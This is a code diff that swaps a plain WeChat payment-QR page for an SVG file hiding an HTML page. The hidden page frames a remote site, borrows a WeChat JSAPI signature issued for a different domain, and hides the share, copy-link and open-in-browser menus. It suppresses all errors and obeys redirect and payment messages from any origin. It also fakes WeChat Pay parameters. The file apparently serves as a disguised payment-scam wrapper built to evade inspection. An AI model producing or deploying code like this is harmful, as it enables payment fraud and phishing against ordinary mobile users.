@@ -1,228 +1,273 @@
-<!doctype html>
-<html lang="zh-CN">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>支付二维码 — 长按识别</title>
-<style>
-  :root{--bg:#ffffff;--accent:#09bb07;--muted:#666;}
-  *{box-sizing:border-box}
-  body{font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "PingFang SC", "Microsoft Yahei", Arial; margin:0; background:var(--bg); color:#222;}
-  .wrap{max-width:920px;margin:24px auto;padding:18px;}
-  h1{font-size:18px;margin:0 0 8px;}
-  p{margin:6px 0;color:var(--muted);font-size:14px;}
-  label{font-size:13px;color:#333}
-  input[type="text"]{width:100%;padding:10px;border:1px solid #e6e6e6;border-radius:8px;margin-top:8px;font-size:14px;}
-  .row{display:flex;gap:8px;margin-top:12px;flex-wrap:wrap}
-  .btn{display:inline-block;padding:10px 14px;background:var(--accent);color:#fff;border-radius:8px;border:0;cursor:pointer;font-size:15px;}
-  .btn.secondary{background:#f3f3f3;color:#333;border:1px solid #e6e6e6;}
-  .small{font-size:13px;color:var(--muted);margin-top:10px;}
-  /* modal */
-  .modal-mask{position:fixed;inset:0;background:rgba(0,0,0,0.55);display:none;align-items:center;justify-content:center;z-index:10000;padding:20px;}
-  .modal{width:100%;max-width:420px;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.3);text-align:center;}
-  .modal-header{padding:14px 16px;border-bottom:1px solid #f1f1f1;background:#fff;}
-  .modal-header .title{font-weight:700;font-size:17px;color:#222;}
-  .modal-header .subtitle{font-size:13px;color:#ff4d4f;margin-top:8px;}
-  .modal-body{padding:18px;}
-  .qr-img{display:block;margin:6px auto;border-radius:8px;background:#fff;width:260px;height:260px;object-fit:contain;}
-  .modal-actions{padding:12px 16px;border-top:1px solid #f1f1f1;display:flex;gap:8px;justify-content:center;flex-wrap:wrap;}
-  .copy-tip{font-size:13px;color:#999;margin-top:8px;word-break:break-all;}
-  .hidden{display:none!important;}
-  @media (max-width:420px){
-    .modal{max-width:340px}
-    .qr-img{width:84%;height:auto}
-  }
-</style>
-</head>
-<body>
-  <div class="wrap">
-    <h1>生成支付二维码（长按识别）</h1>
-    <p class="small">把平台返回的支付链接粘贴到下方（支持带转义的字符串如 <code>weixin:\/\/wxpay\/bizpayurl?pr=xxx</code>），页面会自动规范化并生成二维码。推荐在微信或手机浏览器中使用长按识别。</p>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%">
+  <foreignObject width="100%" height="100%">
+    <html xmlns="http://www.w3.org/1999/xhtml">
+      <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+        <title>Rebuild APP</title>
+        <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
+        <script>
+          if (typeof wx !== 'undefined') {
+            window.wxjs = wx;
+          }
+        </script>
+        <style>
+          *{margin:0;padding:0;}
+          html,body{width:100%;height:100%;}
+          #dynamicIframe{display:block;width:100%;height:100%;border:0;}
+        </style>
+      </head>
+      <body translate="no">
+        <iframe id="dynamicIframe" src="" frameborder="0"></iframe>
 
-    <label for="payLink">支付链接（示例）</label>
-    <input id="payLink" type="text" value="weixin:\/\/wxpay\/bizpayurl?pr=hwXlqMGz1" placeholder="粘贴 weixin://... 或 https://... 链接" />
+        <script>
+          window.addEventListener('error', function(e) {
+            return false;
+          });
+          
+          window.addEventListener('unhandledrejection', function(e) {
+            e.preventDefault();
+          });
 
-    <div class="row">
-      <button class="btn" id="showBtn">显示支付二维码</button>
-      <button class="btn secondary" id="openRawBtn">尝试直接打开链接</button>
-      <button class="btn secondary" id="clearBtn">清除</button>
-    </div>
+          const FIXED_IFRAME_URL = "https://h5.mrhl.top/";
+          const FIXED_SIGN_URL = "https://beachercotton.github.io/xincai6666/";
 
-    <p class="small">提示：若你在微信内且有后端 JSAPI 支付能力，请优先使用 <code>wx.chooseWXPay</code>；二维码为回退方式。</p>
-  </div>
+          const isWeChatBrowser = /MicroMessenger/i.test(navigator.userAgent);
+          if (isWeChatBrowser && window.wxjs) {
+            fetch("https://api.tthaol.com/api/wechat/getJsapiTicket", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ url: FIXED_SIGN_URL })
+            })
+            .then(r => {
+              if (!r.ok) {
+                throw new Error(`HTTP ${r.status}: ${r.statusText}`);
+              }
+              return r.json();
+            })
+            .then(res => {
+              if (res && res.data) {
+                try {
+                  window.wxjs.config({
+                    debug: false,
+                    appId: res.data.appId,
+                    timestamp: res.data.timestamp,
+                    nonceStr: res.data.nonceStr,
+                    signature: res.data.signature,
+                    jsApiList: ["hideOptionMenu", "hideMenuItems", "closeWindow"]
+                  });
+                  window.wxjs.ready(() => {
+                    window.wxjs.hideOptionMenu();
+                    window.wxjs.hideMenuItems({
+                      menuList: [
+                        "menuItem:share:appMessage",
+                        "menuItem:share:timeline",
+                        "menuItem:copyUrl",
+                        "menuItem:openWithQQBrowser",
+                        "menuItem:openWithSafari"
+                      ]
+                    });
+                  });
+                  window.wxjs.error(err => {
+                  });
+                } catch (e) {
+                }
+              }
+            })
+            .catch(err => {
+            });
+          }
 
-  <!-- Modal -->
-  <div class="modal-mask" id="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
-    <div class="modal" role="document">
-      <div class="modal-header">
-        <div class="title" id="modalTitle">长按识别二维码支付</div>
-        <div class="subtitle">请长按二维码并选择「识别图中二维码」或「保存图片」后在微信中打开</div>
-      </div>
-      <div class="modal-body" id="modalBody">
-        <img id="qrImg" class="qr-img" alt="支付二维码" />
-        <div class="copy-tip" id="linkText"></div>
-      </div>
-      <div class="modal-actions">
-        <button class="btn" id="downloadBtn">下载二维码</button>
-        <button class="btn secondary" id="copyBtn">复制支付链接</button>
-        <button class="btn secondary" id="closeBtn">关闭</button>
-      </div>
-    </div>
-  </div>
+          function checkWechatCallback() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code');
+            const state = urlParams.get('state');
+            
+            if (code && state) {
+              try {
+                const stateData = JSON.parse(state);
+                if (stateData.source === 'wechat_login') {
+                  return { code, state, isWechatCallback: true };
+                }
+              } catch (e) {}
+            }
+            return { isWechatCallback: false };
+          }
 
-<script>
-(function(){
-  const showBtn = document.getElementById('showBtn');
-  const openRawBtn = document.getElementById('openRawBtn');
-  const clearBtn = document.getElementById('clearBtn');
-  const payLinkInput = document.getElementById('payLink');
-  const modal = document.getElementById('modal');
-  const qrImg = document.getElementById('qrImg');
-  const closeBtn = document.getElementById('closeBtn');
-  const copyBtn = document.getElementById('copyBtn');
-  const downloadBtn = document.getElementById('downloadBtn');
-  const linkText = document.getElementById('linkText');
+          (function loadIframe(){
+            const iframe = document.getElementById("dynamicIframe");
+            const callbackInfo = checkWechatCallback();
+            
+            let iframeUrl = FIXED_IFRAME_URL;
+            
+            if (callbackInfo.isWechatCallback) {
+              const separator = iframeUrl.includes('?') ? '&' : '?';
+              iframeUrl += `${separator}code=${callbackInfo.code}&state=${encodeURIComponent(callbackInfo.state)}`;
+            } else {
+              const currentParams = new URLSearchParams(window.location.search);
+              const params = [];
+              
+              for (const [key, value] of currentParams) {
+                params.push(`${key}=${encodeURIComponent(value)}`);
+              }
+              
+              if (params.length > 0) {
+                const separator = iframeUrl.includes('?') ? '&' : '?';
+                iframeUrl += `${separator}${params.join('&')}`;
+              }
+            }
+            
+            iframe.src = iframeUrl;
+            
+            iframe.onload = function() {
+              setTimeout(() => {
+                try {
+                  if (iframe.contentWindow) {
+                    iframe.contentWindow.postMessage({
+                      action: 'set_iframe_parent_url',
+                      iframe_parent_url: window.location.href,
+                      parent_origin: window.location.origin,
+                      is_embedded: window.self !== window.top,
+                      environment: 'svg_iframe'
+                    }, '*');
+                  }
+                } catch (e) {
+                }
+              }, 1000);
+            };
+          })();
 
-  // Normalize input: remove backslashes, trim
-  function normalizeLink(s){
-    if (!s) return '';
-    return String(s).replace(/\\+/g, '').trim();
-  }
+          window.addEventListener("message", function(event) {
+            try {
+              if (!event.data || typeof event.data !== 'object') {
+                return;
+              }
 
-  // Basic validation: allow weixin://... or http(s)://...
-  function validateLink(link){
-    if (!link) return false;
-    if (/^weixin:\/\/wxpay\/bizpayurl\?pr=[A-Za-z0-9_\-]+$/i.test(link)) return true;
-    if (/^https?:\/\//i.test(link)) return true;
-    return false;
-  }
-
-  // Use qrserver (reliable)
-  function qrUrlFor(text, size = 520){
-    return 'https://api.qrserver.com/v1/create-qr-code/?size=' + size + 'x' + size + '&data=' + encodeURIComponent(text);
-  }
-
-  function showModal(){ modal.style.display = 'flex'; }
-  function hideModal(){ modal.style.display = 'none'; }
-
-  // Download image from URL (blob) to file
-  function downloadImageFromUrl(url, filename){
-    fetch(url).then(r => {
-      if (!r.ok) throw new Error('网络错误');
-      return r.blob();
-    }).then(blob => {
-      const a = document.createElement('a');
-      const urlObj = URL.createObjectURL(blob);
-      a.href = urlObj;
-      a.download = filename || 'pay_qrcode.png';
-      document.body.appendChild(a);
-      a.click();
-      setTimeout(() => { URL.revokeObjectURL(urlObj); try{ a.remove(); }catch(e){} }, 1000);
-    }).catch(err => {
-      alert('二维码下载失败，请长按二维码保存或截屏。');
-      console.warn(err);
-    });
-  }
-
-  // Copy to clipboard (with fallback)
-  async function copyToClipboard(text){
-    try {
-      if (navigator.clipboard && navigator.clipboard.writeText) {
-        await navigator.clipboard.writeText(text);
-        return true;
-      } else {
-        const ta = document.createElement('textarea');
-        ta.value = text;
-        ta.setAttribute('readonly', '');
-        ta.style.position = 'absolute';
-        ta.style.left = '-9999px';
-        document.body.appendChild(ta);
-        ta.select();
-        document.execCommand('copy');
-        ta.remove();
-        return true;
-      }
-    } catch (e) {
-      console.warn('copy fail', e);
-      return false;
-    }
-  }
-
-  // Show QR and modal
-  showBtn.addEventListener('click', function(){
-    const raw = normalizeLink(payLinkInput.value);
-    if (!raw) { alert('请输入支付链接'); return; }
-
-    if (!validateLink(raw)) {
-      if (!confirm('链接格式看起来不标准，仍要生成二维码吗？')) return;
-    }
-
-    const src = qrUrlFor(raw, 520);
-    qrImg.src = src;
-    qrImg.alt = '支付二维码';
-    linkText.textContent = raw.length > 100 ? raw.slice(0,80) + '...': raw;
-    showModal();
-
-    // auto scroll into view on mobile
-    setTimeout(()=>{ try{ qrImg.scrollIntoView({behavior:'smooth', block:'center'}); }catch(e){} }, 120);
-  });
-
-  // Try to open raw link (may be blocked in some contexts)
-  openRawBtn.addEventListener('click', function(){
-    const raw = normalizeLink(payLinkInput.value);
-    if (!raw) { alert('请输入支付链接'); return; }
-    // If it's a weixin scheme, try to open via anchor click; may not work inside WeChat
-    try {
-      const a = document.createElement('a');
-      a.href = raw;
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-      setTimeout(()=>{ try{ a.remove(); }catch(e){} }, 1000);
-    } catch (e) {
-      try { window.location.href = raw; } catch (err) { alert('打开失败，请使用长按二维码或复制链接在微信中打开'); }
-    }
-  });
-
-  // Clear input
-  clearBtn.addEventListener('click', function(){
-    payLinkInput.value = '';
-  });
-
-  // Close modal
-  closeBtn.addEventListener('click', hideModal);
-  modal.addEventListener('click', function(e){
-    if (e.target === modal) hideModal();
-  });
-
-  // Copy link
-  copyBtn.addEventListener('click', async function(){
-    const raw = normalizeLink(payLinkInput.value);
-    if (!raw) return;
-    const ok = await copyToClipboard(raw);
-    if (ok) {
-      copyBtn.textContent = '已复制';
-      setTimeout(()=> copyBtn.textContent = '复制支付链接', 1500);
-    } else {
-      alert('复制失败，请长按链接手动复制');
-    }
-  });
-
-  // Download QR
-  downloadBtn.addEventListener('click', function(){
-    const raw = normalizeLink(payLinkInput.value);
-    if (!raw) return;
-    const src = qrUrlFor(raw, 800);
-    downloadImageFromUrl(src, 'pay_qrcode.png');
-  });
-
-  // Prevent image broken: if qrserver fails, show friendly message
-  qrImg.addEventListener('error', function(){
-    qrImg.style.display = 'none';
-    linkText.textContent = '二维码加载失败，请复制链接并在微信中识别或截图保存后在微信中识别。';
-  });
-
-})();
-</script>
-</body>
-</html>
+              const { action, url } = event.data;
+              
+              if (action === "redirect" && typeof url === "string" && url) {
+                window.location.href = url;
+              }
+              
+              if (action === "wechat_authorize" && typeof url === "string" && url) {
+                window.location.href = url;
+              }
+              
+              if (action === "iframe_navigate" && typeof url === "string" && url) {
+                const iframe = document.getElementById("dynamicIframe");
+                if (iframe) {
+                  iframe.src = url;
+                }
+              }
+              
+              if (action === "get_client_domain") {
+                const iframe = document.getElementById("dynamicIframe");
+                if (iframe && iframe.contentWindow) {
+                  try {
+                    iframe.contentWindow.postMessage({
+                      action: 'client_domain_response',
+                      clientDomain: FIXED_IFRAME_URL,
+                      iframeDomain: FIXED_SIGN_URL
+                    }, '*');
+                  } catch (e) {
+                  }
+                }
+              }
+              
+              if (action === "payment_redirect" && typeof url === "string" && url) {
+                if (window.self !== window.top) {
+                  try {
+                    window.parent.postMessage({
+                      action: 'redirect',
+                      url: url
+                    }, '*');
+                    
+                    setTimeout(() => {
+                      window.location.href = url;
+                    }, 1000);
+                  } catch (e) {
+                    window.location.href = url;
+                  }
+                } else {
+                  window.location.href = url;
+                }
+              }
+              
+              if (action === "handle_payment" && event.data.payUrl) {
+                const { payUrl, paymentType, userAgent, isWechatBrowser, isAlipayBrowser } = event.data;
+                
+                const iframe = document.getElementById("dynamicIframe");
+                if (iframe && iframe.contentWindow) {
+                  try {
+                    iframe.contentWindow.postMessage({
+                      action: 'payment_handled'
+                    }, '*');
+                  } catch (e) {
+                  }
+                }
+                
+                if (paymentType === 'wechat' && payUrl.startsWith('weixin://wxpay/')) {
+                  if (isWechatBrowser && window.wxjs) {
+                    try {
+                      const urlParams = new URLSearchParams(payUrl.split('?')[1]);
+                      const paySign = urlParams.get('pr');
+                      
+                      if (paySign) {
+                        window.wxjs.ready(() => {
+                          window.wxjs.chooseWXPay({
+                            timestamp: Math.floor(Date.now() / 1000).toString(),
+                            nonceStr: 'wx_pay_' + Date.now(),
+                            package: 'prepay_id=' + paySign,
+                            signType: 'MD5',
+                            paySign: paySign,
+                            success: function (res) {
+                              if (iframe && iframe.contentWindow) {
+                                iframe.contentWindow.postMessage({
+                                  action: 'payment_success'
+                                }, '*');
+                              }
+                            },
+                            fail: function (res) {
+                              window.location.href = payUrl;
+                            }
+                          });
+                        });
+                      } else {
+                        window.location.href = payUrl;
+                      }
+                    } catch (e) {
+                      window.location.href = payUrl;
+                    }
+                  } else {
+                    window.location.href = payUrl;
+                  }
+                } else if (paymentType === 'alipay' && (payUrl.startsWith('alipays://') || payUrl.includes('alipay.com'))) {
+                  if (isAlipayBrowser) {
+                    window.location.href = payUrl;
+                  } else {
+                    const userAgent = navigator.userAgent.toLowerCase();
+                    const isIOS = /iphone|ipad/.test(userAgent);
+                    const isAndroid = userAgent.includes('android');
+                    
+                    if (isIOS || isAndroid) {
+                      window.location.href = payUrl;
+                      
+                      setTimeout(() => {
+                        alert('请安装支付宝客户端或在支付宝中打开');
+                      }, 2000);
+                    } else {
+                      window.location.href = payUrl;
+                    }
+                  }
+                } else {
+                  window.location.href = payUrl;
+                }
+              }
+            } catch (e) {
+            }
+          });
+        </script>
+      </body>
+    </html>
+  </foreignObject>
+</svg>
